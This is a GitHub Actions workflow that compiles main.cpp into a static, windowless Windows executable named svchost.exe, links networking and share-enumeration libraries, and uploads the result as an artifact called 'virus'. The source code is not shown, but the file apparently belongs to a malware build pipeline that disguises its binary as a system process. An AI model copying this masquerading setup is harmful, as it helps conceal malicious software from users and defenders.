name: build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-2022
    steps:
      - uses: actions/checkout@v4
      - name: Build
        shell: cmd
        run: |
          g++ -O2 -municode -mwindows -static -static-libgcc -static-libstdc++ main.cpp -o svchost.exe -lnetapi32 -lws2_32 -ladvapi32 -luser32 -lgdi32 -lole32 -lshell32 -lmpr
          if errorlevel 1 exit /b 1
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: virus
          path: svchost.exe
